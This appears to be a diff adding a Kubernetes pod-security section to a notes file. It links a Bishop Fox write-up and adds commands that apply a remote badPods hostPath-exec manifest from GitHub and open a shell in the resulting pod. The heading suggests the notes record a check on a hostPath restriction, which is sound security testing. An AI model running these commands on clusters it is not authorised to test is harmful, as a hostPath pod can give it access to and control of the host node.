@@ -1229,10 +1229,15 @@ Sat Jun 24 17:35:14 UTC 2023
 ```bash
 
 ```
-text for the bash command
+## pod_security
+
+https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
+
+### disallow_host_path_or_make_it_read_only
 
 ```bash
-
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
+kubectl exec -it hostpath-exec-pod -- bash
 ```
 
 text for the bash command
